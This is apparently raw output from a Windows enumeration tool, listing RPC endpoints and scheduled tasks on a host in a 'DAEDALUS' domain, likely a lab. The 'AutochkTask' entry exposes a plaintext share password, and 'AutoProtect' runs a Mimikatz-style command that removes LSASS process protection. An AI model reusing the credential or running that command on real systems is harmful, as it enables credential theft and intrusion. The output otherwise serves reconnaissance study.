  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[LRPC-e631a61274585212b3]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[LRPC-7edbdb0d6a9102129f]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[LRPC-400246e3457a17efd5]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[LRPC-e4ecfbb8cbe0711a86]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[LRPC-7b6aaec5d1d1ffc5ad]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[csebpub]
  fc48cd89-98d6-4628-9839-86f7a3e4161a v1.0 (): ncalrpc:[dabrpc]
  76f226c3-ec14-4325-8a99-6a46348418af v1.0 (): ncalrpc:[WMsgKRpc0B1680]
  76f226c3-ec14-4325-8a99-6a46348418af v1.0 (): ncacn_np:[\\PIPE\\InitShutdown]
  76f226c3-ec14-4325-8a99-6a46348418af v1.0 (): ncalrpc:[WindowsShutdown]
  d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 (): ncalrpc:[WMsgKRpc0B1680]
  d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 (): ncacn_np:[\\PIPE\\InitShutdown]
  d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 (): ncalrpc:[WindowsShutdown]
====== SCCM ======

  Server                         :
  SiteCode                       :
  ProductVersion                 :
  LastSuccessfulInstallParams    :

====== ScheduledTasks ======

Non Microsoft scheduled tasks (via WMI)

  Name                              :   Server Initial Configuration Task
  Principal                         :
      GroupId                       :
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   $(@%systemroot%\system32\SrvInitConfig.exe,-100)
  Description                       :   $(@%systemroot%\system32\SrvInitConfig.exe,-101)
  Source                            :
  State                             :   Disabled
  SDDL                              :
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   /disableconfigtask
      Execute                       :   %windir%\system32\srvinitconfig.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskBootTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   .NET Framework NGEN v4.0.30319
  Principal                         :
      GroupId                       :
      Id                            :   Author
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :
  Description                       :
  Source                            :
  State                             :   Ready
  SDDL                              :   D:(A;OICI;FA;;;BA)(A;OICI;FA;;;SY)(A;OICI;GR;;;AU)(A;;FRFX;;;LS)
  Enabled                           :   True
  Date                              :   9/30/2010 2:53:37 PM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT2H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {84F0FAE1-C27B-4F6F-807B-28CF6F96287D}
      Data                          :   /RuntimeWide
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   .NET Framework NGEN v4.0.30319 64
  Principal                         :
      GroupId                       :
      Id                            :   Author
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
   Description                       :
  Source                            :
  State                             :   Ready
  SDDL                              :   D:(A;OICI;FA;;;BA)(A;OICI;FA;;;SY)(A;OICI;GR;;;AU)(A;;FRFX;;;LS)
  Enabled                           :   True
  Date                              :   9/30/2010 2:53:37 PM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT2H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {429BC048-379E-45E0-80E4-EB1977941B5C}
      Data                          :   /RuntimeWide
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   .NET Framework NGEN v4.0.30319 64 Critical
  Principal                         :
      GroupId                       :
      Id                            :   Author
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :
  Description                       :
  Source                            :
  State                             :   Disabled
  SDDL                              :   D:(A;OICI;FA;;;BA)(A;OICI;FA;;;SY)(A;OICI;GR;;;AU)(A;;FRFX;;;LS)
  Enabled                           :   False
  Date                              :   9/30/2010 2:53:37 PM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT2H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {613FBA38-A3DF-4AB8-9674-5604984A299A}
      Data                          :   /RuntimeWide
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskIdleTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   .NET Framework NGEN v4.0.30319 Critical
  Principal                         :
      GroupId                       :
      Id                            :   Author
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :
  Description                       :
  Source                            :
  State                             :   Disabled
  SDDL                              :   D:(A;OICI;FA;;;BA)(A;OICI;FA;;;SY)(A;OICI;GR;;;AU)(A;;FRFX;;;LS)
  Enabled                           :   False
  Date                              :   9/30/2010 2:53:37 PM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT2H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {DE434264-8FE9-4C0B-A83B-89EBEEBFF78E}
      Data                          :   /RuntimeWide
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskIdleTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   SmartScreenSpecific
  Principal                         :
      GroupId                       :
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   $(@%systemroot%\system32\apprepsync.dll,-700)
  Description                       :   $(@%systemroot%\system32\apprepsync.dll,-702)
  Source                            :   $(@%systemroot%\system32\apprepsync.dll,-701)
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)(A;;FRFX;;;LS)(A;;FRFX;;;AU)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {9F2B0085-9218-42A1-88B0-9F0E65851666}
      Data                          :   U
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskLogonTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      Delay                         :   PT30M
      ------------------------------

  Name                              :   ProgramDataUpdater
  Principal                         :
      GroupId                       :
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   $(@%SystemRoot%\system32\invagent.dll,-701)
  Description                       :   $(@%SystemRoot%\system32\invagent.dll,-702)
  Source                            :   $(@%SystemRoot%\system32\invagent.dll,-701)
  State                             :   Ready
  SDDL                              :   D:(A;;GA;;;BA)(A;;GA;;;SY)(A;;FRFX;;;LS)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   -maintenance
      Execute                       :   %windir%\system32\compattelrunner.exe
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   Pre-staged app cleanup
  Principal                         :
      GroupId                       :
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :
  Description                       :
  Source                            :
  State                             :   Disabled
  SDDL                              :   D:(A;;GA;;;SY)(A;;FRFX;;;LS)(A;;FA;;;BA)
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   %windir%\system32\AppxDeploymentClient.dll,AppxPreStageCleanupRunTask
      Execute                       :   %windir%\system32\rundll32.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskLogonTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      Delay                         :   PT1H
      ------------------------------

  Name                              :   AutochkTask
  Principal                         :
      GroupId                       :
      Id                            :   Author
      LogonType                     :   1
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   svc_dev
  Author                            :   DAEDALUS\Administrator
  Description                       :
  Source                            :
  State                             :   Ready
  SDDL                              :
  Enabled                           :   True
  Date                              :   1/3/2020 3:34:29 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   net use E: \\fin01\invoices /user:billing_user D43d4lusB1ll1ngB055
      Execute                       :   powershell.exe
      ------------------------------
  Triggers                          :
       Type                          :   MSFT_TaskTimeTrigger
      Enabled                       :   True
      StartBoundary                 :   2020-01-13T04:13:47
      Interval                      :   PT1M
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   AutoProtect
  Principal                         :
      GroupId                       :
      Id                            :   Author
      LogonType                     :   1
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   Administrator
  Author                            :   DAEDALUS\Administrator
  Description                       :
  Source                            :
  State                             :   Disabled
  SDDL                              :
  Enabled                           :   False
  Date                              :   10/8/2020 2:03:48 PM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   C:\Windows\System32\msupdate.exe "!+" "!processprotect /process:lsass.exe /trx" "!-" "exit"
      Execute                       :   C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTimeTrigger
      Enabled                       :   True
      StartBoundary                 :   2020-10-08T14:01:07
      Interval                      :   PT5M
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   BitLocker Encrypt All Drives
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :
  Author                            :
  Description                       :
  Source                            :
  State                             :   Ready
  SDDL                              :   D:P(A;;FRFX;;;AU)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {61BCD1B9-340C-40EC-9D41-D7F1C0632F05}
      Data                          :   BitLockerEncryptAllDrives
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   BitLocker MDM policy Refresh
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :
  Author                            :
  Description                       :
  Source                            :
  State                             :   Ready
  SDDL                              :   D:P(A;;FRFX;;;AU)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {61BCD1B9-340C-40EC-9D41-D7F1C0632F05}
      Data                          :   BitLockerPolicy
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   SyspartRepair
  Principal                         :
      GroupId                       :
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :
  Description                       :
  Source                            :
  State                             :   Ready
  SDDL                              :   D:P(A;;FR;;;AU)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   %windir% /sysrepair
      Execute                       :   %windir%\system32\bcdboot.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   CreateObjectTask
  Principal                         :
      GroupId                       :
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :
  Description                       :
  Source                            :
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;SY)(A;;FRFX;;;IU)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT1H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {E4544ABA-62BF-4C54-AAB2-EC246342626C}
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   Device
  Principal                         :
      GroupId                       :
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :
  Description                       :
  Source                            :
  State                             :   Ready
  SDDL                              :   D:(A;;GA;;;BA)(A;;GA;;;SY)(A;;FRFX;;;LS)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   P4D
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Execute                       :   %windir%\system32\devicecensus.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTimeTrigger
      Enabled                       :   True
      StartBoundary                 :   2008-09-01T03:00:00
      Interval                      :   P1D
      StopAtDurationEnd             :   False
      RandomDelay                   :   PT2H
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   False
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   DXGIAdapterCache
  Principal                         :
      GroupId                       :
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :
  Description                       :
  Source                            :
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   False
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Execute                       :   %windir%\system32\dxgiadaptercache.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   Diagnostics
  Principal                         :
      GroupId                       :
      Id                            :   System
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :
  Description                       :
  Source                            :
  State                             :   Ready
  SDDL                              :
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT1H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   -z
      Execute                       :   %windir%\system32\disksnapshot.exe
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   StorageSense
  Principal                         :
      GroupId                       :   Users
      Id                            :   Authenticated Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :
  Author                            :
  Description                       :
  Source                            :
  State                             :   Ready
  SDDL                              :
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT1H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {AB2A519B-03B0-43CE-940A-A73DF850B49A}
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   EDP App Launch Task
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :
  Author                            :
  Description                       :
  Source                            :
  State                             :   Ready
  SDDL                              :   D:P(A;;FRFX;;;AU)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {61BCD1B9-340C-40EC-9D41-D7F1C0632F05}
      Data                          :   AppLaunch
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   EDP Auth Task
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :
  Author                            :
  Description                       :
  Source                            :
  State                             :   Ready
  SDDL                              :   D:P(A;;FRFX;;;AU)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {61BCD1B9-340C-40EC-9D41-D7F1C0632F05}
      Data                          :   ReAuth
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   EDP Inaccessible Credentials Task
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :
  Author                            :
  Description                       :
  Source                            :
  State                             :   Ready
  SDDL                              :   D:P(A;;FRFX;;;AU)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {61BCD1B9-340C-40EC-9D41-D7F1C0632F05}
      Data                          :   MissingCredentials
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   StorageCardEncryption Task
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :
  Author                            :
  Description                       :
  Source                            :
  State                             :   Ready
  SDDL                              :   D:P(A;;FRFX;;;AU)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {61BCD1B9-340C-40EC-9D41-D7F1C0632F05}
      Data                          :   SDCardEncryptionPolicy
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   EnableErrorDetailsUpdate
  Principal                         :
      GroupId                       :
      Id                            :   Users
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   $(@%SystemRoot%\system32\ErrorDetailsUpdate.dll,-600)
  Description                       :   $(@%SystemRoot%\system32\ErrorDetailsUpdate.dll,-601)
  Source                            :
  State                             :   Ready
  SDDL                              :
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   False
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT1M
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {FE285C8C-5360-41C1-A700-045501C740DE}
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   ErrorDetailsUpdate
  Principal                         :
      GroupId                       :
      Id                            :   Author
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   NETWORK SERVICE
  Author                            :   $(@%systemroot%\system32\ErrorDetailsUpdate.dll,-600)
  Description                       :   $(@%SystemRoot%\system32\ErrorDetailsUpdate.dll,-601)
  Source                            :
  State                             :   Disabled
  SDDL                              :
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT5M
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {9CDA66BE-3271-4723-8D35-DD834C58AD92}
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   ScanForUpdates
  Principal                         :
      GroupId                       :
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :
  Description                       :
  Source                            :
  State                             :   Disabled
  SDDL                              :   D:(A;;FA;;;SY)(A;;FRFX;;;BA)
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT4H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {A558C6A5-B42B-4C98-B610-BF9559143139}
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTimeTrigger
      Enabled                       :   True
      StartBoundary                 :   2013-12-31T17:00:00-07:00
      Interval                      :   P1D
      StopAtDurationEnd             :   False
      RandomDelay                   :   P1D
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------
      Type                          :   MSFT_TaskTimeTrigger
      Enabled                       :   False
      StartBoundary                 :   2013-12-31T17:00:00-07:00
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   ScanForUpdatesAsUser
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   AllUsers
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :
  Author                            :
  Description                       :
  Source                            :
  State                             :   Disabled
  SDDL                              :   D:(A;;FA;;;SY)(A;;FA;;;BA)(A;;FRFX;;;IU)
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT4H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {DDAFAEA2-8842-4E96-BADE-D44A8D676FDB}
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   WakeUpAndContinueUpdates
  Principal                         :
      GroupId                       :
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :
  Description                       :
  Source                            :
  State                             :   Disabled
  SDDL                              :   D:(A;;FA;;;SY)(A;;FRFX;;;BA)
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT4H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {0DC331EE-8438-49D5-A721-E10B937CE459}
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   WakeUpAndScanForUpdates
  Principal                         :
      GroupId                       :
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :
  Description                       :
  Source                            :
  State                             :   Disabled
  SDDL                              :   D:(A;;FA;;;SY)(A;;FRFX;;;BA)
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT4H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {D5A04D91-6FE6-4FE4-A98A-FEB4500C5AF7}
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTimeTrigger
      Enabled                       :   True
      StartBoundary                 :   2013-12-31T17:00:00-07:00
      Interval                      :   P1D
      StopAtDurationEnd             :   False
      RandomDelay                   :   P1D
      ------------------------------

  Name                              :   Notifications
  Principal                         :
      GroupId                       :   Authenticated Users
      Id                            :   Creator
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :
  Author                            :
  Description                       :   Location Notification
  Source                            :
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)(A;;FRFX;;;AU)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Execute                       :   %windir%\System32\LocationNotificationWindows.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   WindowsActionDialog
  Principal                         :
      GroupId                       :   Authenticated Users
      Id                            :   Creator
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :
  Author                            :
  Description                       :   Location Notification
  Source                            :
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)(A;;FRFX;;;AU)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Execute                       :   %windir%\System32\WindowsActionDialog.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   SystemSoundsService
  Principal                         :
      GroupId                       :   Users
      Id                            :   Group
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :
  Author                            :
  Description                       :   System Sounds User Mode Agent
  Source                            :   Microsoft Corporation
  State                             :   Disabled
  SDDL                              :   D:P(A;;FA;;;BA)(A;;FA;;;SY)(A;;FR;;;AU)
  Enabled                           :   False
  Date                              :   6/23/2005 2:48:00 PM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {2DEA658F-54C1-4227-AF9B-260AB5FC3543}
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskLogonTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

